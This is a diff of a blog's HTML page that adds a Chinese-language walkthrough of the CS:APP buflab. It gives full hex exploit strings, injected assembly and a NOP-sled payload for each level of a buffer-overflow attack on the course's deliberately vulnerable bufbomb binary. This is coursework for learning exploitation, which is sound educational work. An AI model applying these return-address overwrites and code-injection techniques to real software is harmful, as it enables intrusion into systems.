@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="csapp,overflow,assembly,">
 
 
 
@@ -95,16 +95,18 @@
   </script>
 
 
-<meta name="description" content="A programmer&apos;s thinking">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Little csd&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/summary/index.html">
+<meta name="description" content="序　　这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再">
+<meta name="keywords" content="csapp,overflow,assembly">
+<meta property="og:type" content="article">
+<meta property="og:title" content="csapp-Buflab">
+<meta property="og:url" content="http://yoursite.com/2019/01/15/csapp-Buflab/index.html">
 <meta property="og:site_name" content="Little csd&#39;s blog">
-<meta property="og:description" content="A programmer&apos;s thinking">
+<meta property="og:description" content="序　　这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-01-15T16:10:48.937Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Little csd&#39;s blog">
-<meta name="twitter:description" content="A programmer&apos;s thinking">
+<meta name="twitter:title" content="csapp-Buflab">
+<meta name="twitter:description" content="序　　这是csapp系列的第四篇文章了。具体题目请见官网。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的资料看了之后再">
 
 
 
@@ -134,7 +136,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/summary/">
+  <link rel="canonical" href="http://yoursite.com/2019/01/15/csapp-Buflab/">
 
 
 
@@ -152,7 +154,7 @@
         }
     })();
 </script>
-  <title>Tag: summary | Little csd's blog</title>
+  <title>csapp-Buflab | Little csd's blog</title>
   
 
 
@@ -171,7 +173,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -306,52 +308,226 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>summary<small>Tag</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/csapp-Buflab/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="little csd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user_image.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Little csd's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/01/01/summary-2018/" itemprop="url">
-              
-                <span itemprop="name">summary-2018</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">csapp-Buflab</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-01-01T11:05:28+08:00" content="2019-01-01">
-          01-01
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-15T22:58:59+08:00">
+                2019-01-15
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/csapp/" itemprop="url" rel="index">
+                    <span itemprop="name">csapp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.6k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第四篇文章了。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的buflab的部分流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　本文建立在csapp完成了attacklab的基础上。如果还没完成上一个实验，请先将其完成再进行本实验。不过个人觉得上一个实验能够独立完成的话，这个实验难度就真的很小了。同样的，还是很建议先把官方给的<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="noopener">资料</a>看了之后再来做这个实验。不过笔者这边电脑看的时候有一些乱码，不知道其他电脑会不会一样。</p>
+<h2 id="buflab-实验要求"><a href="#buflab-实验要求" class="headerlink" title="buflab 实验要求"></a>buflab 实验要求</h2><p>　　这个实验要求我们使用缓冲区溢出漏洞对bufbomb进行攻击。总共5个关卡。</p>
+<blockquote>
+<p>实验文件<br>bufbomb：我们需要攻击的对象<br>hex2raw：帮助我们成功攻击字符串的文件<br>makecookie：根据用户id产生对应的cookie (./makecookie [userid] 即可生成, 注意将[userid]替换成自己喜欢的字符串)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="buflab-的一些注意点"><a href="#buflab-的一些注意点" class="headerlink" title="buflab 的一些注意点"></a>buflab 的一些注意点</h2><p>　　首先，本实验和上一个实验相比的话，难度还是要小了很多的。基本上除了最后一个level之外都没什么难度。但有一些不一样的细节需要注意<br>　　1. bufbomb在编译的时候加上了 -m32 参数，意味着无论你的电脑是否是64位系统，编译器遵循的都是IA-32规则。也就是说，我们需要用到的函数地址，指针等都是32位，这点和上一个实验不同，需要很小心。<br>　　2. 本实验中参数的传递比较接近RISC，参数是放在栈当中进行传递的，而不是放在%rdi,%rsi这样的寄存器上。所以建议完成本实验时，还是要多画图，结合图像来看的话要简单易懂很多。<br>　　3. 本实验和上一个实验基本上的架构是很相似的，我们需要做的事情也差不多，因此一些做法可以借鉴上一个实验中的相关关卡。</p>
+<h3 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h3><p>　　首先，我们还是一样，先用objdump反编译，得到bufbomb.txt文件，便于查看。前面四道题中，都调用到了这样的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>　　可以看到，和上一个实验基本没有区别。对于第一题来说，我们需要成功进入smoke()函数，只需将要丢弃的一大段字节随便填充上去，最后overwrite返回的地址即可。注意，这里的地址只有四个字节。答案就不贴了。</p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>　　这道题需要我们val这个数值传入fizz()函数，并且val等于我们的cookie。很简单，注意到这道题中传递参数是用栈来实现的，我们只要把cookie放在栈上即可，连代码注入都不需要。但一定要很小心字节的顺序，在这种问题上卡住还是很吃亏的。答案如下(其中60可以随意替换成其他值)：</p>
+<blockquote>
+<p>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 42 8c 04 08 // 跳转到fizz函数入口<br>60 60 60 60 c0 e5 c4 53 // 此行为cookie，注意前面的四个字节不能省掉</p>
+</blockquote>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>　　对于这道题，我们需要修改一个全局变量global_value的值，使其等于cookie。这道题就需要用到代码注入了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $<span class="number">0x53c4e5c0</span>,%eax <span class="comment">// 左侧的值为cookie，我们先将其移动到%eax</span></span><br><span class="line">mov %eax,<span class="number">0x804d100</span>   <span class="comment">// 放入global_value所在的内存单元(这里的地址可以直接看反汇编文件得到)</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure></p>
+<p>　　将上面的汇编代码编译，并反编译之后，我们就得到了它对应的机器级表示。在放进我们的文件(这里是bufbomb3.txt)当中，使用cat bufbomb3.txt | ./hex2raw | ./bufbomb -u [userid] 命令即可。我的bufbomb.3txt文件内容为：</p>
+<blockquote>
+<p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 a3 00 d1<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 00 39 68 55<br>9d 8c 04 08</p>
+</blockquote>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>　　这道题开始有一定的难度了。本题目要求我们使用代码注入并且不能破坏原有的栈数据，最后使得getbuf函数返回cookie。有比较多的细节需要我们去注意。<br>　　首先，我们需要想到，怎样才不会破坏原有的栈数据呢？首先，我们不能覆盖到return address再往上的数据，也就是说，我们输入的字符串长度不能超过48，否则原有的某些数据可能会被我们覆盖。其次，在bufbomb的反汇编文件中，getbuf有<b>push %ebp</b>这样的指令将%ebp保存在栈上，而当我们覆盖了return address后，显然这个数据就丢失了。那怎么办？注意到这道题目中栈的位置不会发生改变。我们可以用gdb调试，在这个函数打一个断点，然后打印出放在栈上的这个值。到时在注入代码的时候记得把这个值放到%ebp即可。<br>　　为了能够顺利地回到test函数中，我们还要查看一下test函数在call getbuf后的下一个指令的位置，在我们的代码中要将PC更改为这个值，这样程序看起来就像是从getbuf当中返回了。<br>　　因此，我们可以得到答案：</p>
+<blockquote>
+<p>60 60 60 60 60 60 60 60<br>b8 c0 e5 c4 53 68 be 8d  // 将cookie放到%eax, 并把test中的下一个指令位置push进栈<br>04 08 c3 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>60 60 60 60 60 60 60 60<br>50 39 68 55 00 39 68 55  // 后面四个字节跳转到我们注入了代码的地址，前面四个字节对应着%ebp的值，pop的时候就会被放回%ebp了</p>
+</blockquote>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>　　不得不说，这道题当纯看题目要求时，觉得还是很变态的。首先，我们需要做到level3中的所有要求。其次，getbuf会被调用5次，我们需要每一次都能满足要求。并且，比较难的一点是，每一次getbuf的时候，stack的%esp(%ebp)指针的位置是不确定的，这也就意味着，我们没办法精确地跳转到我们注入的代码的位置。当然，如果还有印象的话，书中有提到对付ASLR的一种办法，就是使用nop指令，nop即no operation，CPU不会进行任何操作，相当与直接跳过这个指令。我们可以在注入的代码前面加入大量的nop，这样的话只要能够跳转到任意一个nop指令，PC就会像滑雪橇一样滑到我们注入的代码。我们只需要在最后的几行实现保存即可。<br>　　要保证栈不被破坏，我们在注入的代码中还需要做到以下几点：<br>　　1. 找到%ebp对应的值，并将其写入其中。<br>　　2. 将cookie放入%eax中，作为返回值<br>　　3. 注入代码的末尾需要将testn中的下一条指令push进栈当中，这样才能顺利返回到testn。同时，整个代码的总字符数必须为528，多了就溢出，栈被破坏，少了的话没办法覆盖掉return address。<br>　　其中2和3和上一个level没有区别，最主要是第一个，既然%ebp已经被覆盖了，我们要怎么知道它原先的值是多少呢？其实，我们可以从反汇编文件得到答案。%ebp其实就是testn的堆栈帧，我们看testn函数，它在push操作后，将%esp赋值给了%ebp，然后自己减掉了0x24，也就是说，call getbuf刚进入时，%esp + 0x24 + 4 = %ebp， 通过画图像，我们就可以很容易得到相关的规律了。小心push的时候%esp会-4。<br>　　以下是我的答案：</p>
+<blockquote>
+<p>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 b8 c0 e5 c4 53 68 3a<br>8e 04 08 8d 6c 24 2c c3 90 90 90 90 00 38 68 55</p>
+</blockquote>
 
       
     </div>
+    
+    
+    
 
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- The artical is over <i class="fa fa-paw"></i> Thanks for your reading -------------</div>
+    
+</div>
+      
+	</div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/csapp/" rel="tag"><i class="fa fa-tag"></i> csapp</a>
+          
+            <a href="/tags/overflow/" rel="tag"><i class="fa fa-tag"></i> overflow</a>
+          
+            <a href="/tags/assembly/" rel="tag"><i class="fa fa-tag"></i> assembly</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/15/csapp-Attacklab/" rel="next" title="csapp-Attacklab">
+                <i class="fa fa-chevron-left"></i> csapp-Attacklab
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -359,6 +535,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -379,8 +559,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -464,6 +653,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#序"><span class="nav-number">1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buflab-实验要求"><span class="nav-number">2.</span> <span class="nav-text">buflab 实验要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buflab-的一些注意点"><span class="nav-number">3.</span> <span class="nav-text">buflab 的一些注意点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-0"><span class="nav-number">3.1.</span> <span class="nav-text">level 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-number">3.2.</span> <span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-number">3.3.</span> <span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3"><span class="nav-number">3.4.</span> <span class="nav-text">level 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-4"><span class="nav-number">3.5.</span> <span class="nav-text">level 4</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -620,6 +825,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
